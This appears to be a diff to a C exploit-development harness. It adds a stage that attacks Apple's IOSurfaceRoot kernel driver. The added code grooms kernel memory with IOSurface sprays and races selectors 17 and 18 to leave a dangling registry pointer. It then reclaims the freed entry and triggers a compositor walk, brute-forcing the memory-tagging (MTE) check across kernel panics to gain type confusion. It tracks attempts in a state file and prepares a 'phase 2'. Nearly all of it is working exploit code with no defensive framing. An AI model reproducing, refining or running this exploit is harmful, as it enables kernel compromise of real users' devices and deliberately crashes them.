@@ -19269,6 +19269,230 @@ new_modes:
             rlog("*** Probe complete ***\n");
             goto done;
         }
+        if (rounds == 249) {
+            rlog("*** rounds=249: MTE brute-force UAF — sel17/sel18 race + IOSurface spray ***\n");
+            rlog("  Strategy: 1/16 chance MTE tag matches per attempt\n");
+            rlog("  If tag mismatch → kernel panic → reboot → retry\n");
+            rlog("  If tag match → SURVIVE → type confusion achieved\n\n");
+
+            /* Recovery state tracking across reboots */
+            char r249_state_path[256];
+            {
+                char *hd = getenv("HOME");
+                snprintf(r249_state_path, sizeof(r249_state_path),
+                         "%s/Documents/uaf_state.bin", hd ? hd : "/tmp");
+            }
+            int r249_attempt = 0;
+            FILE *r249_rf = fopen(r249_state_path, "rb");
+            if (r249_rf) {
+                uint32_t magic;
+                if (fread(&magic, 4, 1, r249_rf) == 1 && magic == 0xDEAD0249) {
+                    fread(&r249_attempt, 4, 1, r249_rf);
+                    rlog("  Previous attempts: %d (all panicked = MTE mismatch)\n", r249_attempt);
+                }
+                fclose(r249_rf);
+            }
+            r249_attempt++;
+            rlog("  This is attempt #%d (expected ~16 needed)\n\n", r249_attempt);
+
+            /* Save state BEFORE triggering — survives kernel panic */
+            {
+                FILE *sf = fopen(r249_state_path, "wb");
+                if (sf) {
+                    uint32_t magic = 0xDEAD0249;
+                    fwrite(&magic, 4, 1, sf);
+                    fwrite(&r249_attempt, 4, 1, sf);
+                    fflush(sf);
+                    fsync(fileno(sf));
+                    fclose(sf);
+                }
+            }
+            rlog("  State marker saved\n");
+
+            io_service_t r249_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!r249_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r249_done; }
+
+            /* Step 1: Pre-groom — fill zone holes with IOSurface objects
+             * IOSurface registry entries live in kalloc.type, so we spray
+             * IOSurface objects (same zone) to fill gaps */
+            rlog("  Step 1: Pre-groom with 500 IOSurface objects...\n");
+            CFMutableDictionaryRef r249_props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int r249_w = 32, r249_h = 32, r249_bpe = 4, r249_pf = 0x42475241;
+            CFNumberRef r249_wn = CFNumberCreate(NULL, kCFNumberIntType, &r249_w);
+            CFNumberRef r249_hn = CFNumberCreate(NULL, kCFNumberIntType, &r249_h);
+            CFNumberRef r249_bn = CFNumberCreate(NULL, kCFNumberIntType, &r249_bpe);
+            CFNumberRef r249_fn = CFNumberCreate(NULL, kCFNumberIntType, &r249_pf);
+            CFDictionarySetValue(r249_props, CFSTR("IOSurfaceWidth"), r249_wn);
+            CFDictionarySetValue(r249_props, CFSTR("IOSurfaceHeight"), r249_hn);
+            CFDictionarySetValue(r249_props, CFSTR("IOSurfaceBytesPerElement"), r249_bn);
+            CFDictionarySetValue(r249_props, CFSTR("IOSurfacePixelFormat"), r249_fn);
+
+            #define R249_PREGROOM 500
+            #define R249_SPRAY 300
+            IOSurfaceRef r249_groom[R249_PREGROOM];
+            int r249_groom_ok = 0;
+            for (int i = 0; i < R249_PREGROOM; i++) {
+                r249_groom[i] = IOSurfaceCreate(r249_props);
+                if (r249_groom[i]) r249_groom_ok++;
+            }
+            rlog("  Pre-groom: %d/%d IOSurfaces created\n", r249_groom_ok, R249_PREGROOM);
+
+            /* Step 2: Run the sel17/sel18 race to create dangling entries
+             * sel17 = async register (creates registry entry)
+             * sel18 = sync deregister (frees registry entry)
+             * Race: async worker still setting up when deregister runs
+             * Result: dangling pointer in registry list */
+            rlog("  Step 2: sel17/sel18 race (1000 iterations)...\n");
+
+            io_connect_t r249_rc = IO_OBJECT_NULL;
+            IOServiceOpen(r249_svc, mach_task_self(), 0, &r249_rc);
+            if (!r249_rc) { rlog("  open failed\n"); goto r249_cleanup; }
+
+            uint64_t r249_inp[3] = {1, 2, 3};
+            #define R249_RACE_ITERS 1000
+            mach_port_t r249_wps[R249_RACE_ITERS];
+            int r249_wp_n = 0;
+            int r249_reg_ok = 0, r249_dereg_ok = 0;
+
+            for (int i = 0; i < R249_RACE_ITERS; i++) {
+                mach_port_t wp = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref = 0xD249 + i;
+
+                kern_return_t kr_reg = IOConnectCallAsyncMethod(r249_rc, 17, wp, &ref, 1,
+                    NULL, 0, r249_inp, 24, NULL, NULL, NULL, NULL);
+                kern_return_t kr_dereg = IOConnectCallMethod(r249_rc, 18, NULL, 0,
+                    r249_inp, 24, NULL, NULL, NULL, NULL);
+
+                if (kr_reg == 0) r249_reg_ok++;
+                if (kr_dereg == 0) r249_dereg_ok++;
+                r249_wps[r249_wp_n++] = wp;
+            }
+            rlog("  Race: reg=%d/%d dereg=%d/%d\n",
+                 r249_reg_ok, R249_RACE_ITERS - r249_reg_ok,
+                 r249_dereg_ok, R249_RACE_ITERS - r249_dereg_ok);
+
+            /* Step 3: IMMEDIATELY spray IOSurfaces to reclaim freed entries
+             * These replacement objects have valid +0xD8 fields (kernel pointers)
+             * If MTE tag of replacement matches the dangling pointer's tag → survive */
+            rlog("  Step 3: Spray %d replacement IOSurfaces...\n", R249_SPRAY);
+            IOSurfaceRef r249_spray[R249_SPRAY];
+            int r249_spray_ok = 0;
+            for (int i = 0; i < R249_SPRAY; i++) {
+                r249_spray[i] = IOSurfaceCreate(r249_props);
+                if (r249_spray[i]) r249_spray_ok++;
+            }
+            rlog("  Spray: %d/%d created\n", r249_spray_ok, R249_SPRAY);
+
+            /* Also spray via sel17 on a fresh connection for smaller allocations */
+            io_connect_t r249_sc = IO_OBJECT_NULL;
+            IOServiceOpen(r249_svc, mach_task_self(), 0, &r249_sc);
+            if (r249_sc) {
+                for (int i = 0; i < 256; i++) {
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref = 0x249000 + i;
+                    uint64_t inp[3] = {(uint64_t)(i + 1), 0, 0};
+                    IOConnectCallAsyncMethod(r249_sc, 17, wp, &ref, 1,
+                        NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                    mach_port_deallocate(mach_task_self(), wp);
+                }
+                rlog("  Extra spray: 256 registry entries via sel17\n");
+            }
+
+            /* Step 4: Trigger compositor registry walk
+             * This is what causes the kernel to traverse the registry list
+             * and dereference the dangling pointer's +0xD8 field.
+             * If MTE tag matches → no panic → we survive!
+             * If MTE mismatch → kernel tag check fault → panic */
+            rlog("  Step 4: Render loop (5s) — triggering compositor walk...\n");
+            rlog("  >>> If device panics here: MTE mismatch (attempt #%d) <<<\n", r249_attempt);
+            rlog("  >>> If we survive: MTE MATCH — type confusion achieved! <<<\n");
+            fflush(stdout);
+
+            p13_render_run = 1;
+            p13_render_frames = 0;
+            pthread_t r249_rt;
+            pthread_create(&r249_rt, NULL, p13_render_loop, NULL);
+            for (int s = 0; s < 5; s++) {
+                usleep(1000000);
+                rlog("  +%ds (alive)", s + 1);
+            }
+            p13_render_run = 0;
+            pthread_join(r249_rt, NULL);
+            rlog("\n  Render: %d frames\n", p13_render_frames);
+
+            /* ========== IF WE REACH HERE: MTE TAG MATCHED! ========== */
+            rlog("\n  ****************************************************\n");
+            rlog("  *** MTE BRUTE-FORCE SUCCESS — SURVIVED THE UAF! ***\n");
+            rlog("  *** Attempt #%d — type confusion is active      ***\n", r249_attempt);
+            rlog("  ****************************************************\n\n");
+
+            /* Log spray surface IDs for analysis */
+            rlog("  Spray surface IDs (first 20):\n");
+            for (int i = 0; i < 20 && i < R249_SPRAY; i++) {
+                if (r249_spray[i]) {
+                    rlog("    spray[%d] id=%u base=%p alloc=%zu\n", i,
+                         IOSurfaceGetID(r249_spray[i]),
+                         IOSurfaceGetBaseAddress(r249_spray[i]),
+                         IOSurfaceGetAllocSize(r249_spray[i]));
+                }
+            }
+
+            /* Try to detect which spray object replaced the freed entry
+             * by checking if any spray surfaces have unexpected state */
+            rlog("\n  Checking spray surfaces for anomalies...\n");
+            for (int i = 0; i < R249_SPRAY; i++) {
+                if (!r249_spray[i]) continue;
+                IOSurfaceLock(r249_spray[i], kIOSurfaceLockReadOnly, NULL);
+                void *base = IOSurfaceGetBaseAddress(r249_spray[i]);
+                size_t sz = IOSurfaceGetAllocSize(r249_spray[i]);
+                if (base && sz > 0) {
+                    uint8_t *p = (uint8_t *)base;
+                    int nonzero = 0;
+                    for (size_t j = 0; j < sz && j < 256; j++) {
+                        if (p[j] != 0) nonzero++;
+                    }
+                    if (nonzero > 0) {
+                        rlog("    spray[%d] id=%u has %d non-zero bytes in first 256\n",
+                             i, IOSurfaceGetID(r249_spray[i]), nonzero);
+                    }
+                }
+                IOSurfaceUnlock(r249_spray[i], kIOSurfaceLockReadOnly, NULL);
+            }
+
+            /* Update state to record success */
+            {
+                FILE *sf = fopen(r249_state_path, "wb");
+                if (sf) {
+                    uint32_t magic = 0xDEAD0250;
+                    fwrite(&magic, 4, 1, sf);
+                    fwrite(&r249_attempt, 4, 1, sf);
+                    fclose(sf);
+                }
+            }
+            rlog("  Success state saved — ready for phase 2\n");
+
+            r249_cleanup:
+            for (int i = 0; i < R249_SPRAY; i++)
+                if (r249_spray[i]) CFRelease(r249_spray[i]);
+            for (int i = 0; i < R249_PREGROOM; i++)
+                if (r249_groom[i]) CFRelease(r249_groom[i]);
+            for (int i = 0; i < r249_wp_n; i++)
+                mach_port_deallocate(mach_task_self(), r249_wps[i]);
+            if (r249_sc) IOServiceClose(r249_sc);
+            if (r249_rc) IOServiceClose(r249_rc);
+            CFRelease(r249_props); CFRelease(r249_wn); CFRelease(r249_hn);
+            CFRelease(r249_bn); CFRelease(r249_fn);
+            IOObjectRelease(r249_svc);
+            r249_done:
+            rlog("*** r=249 complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
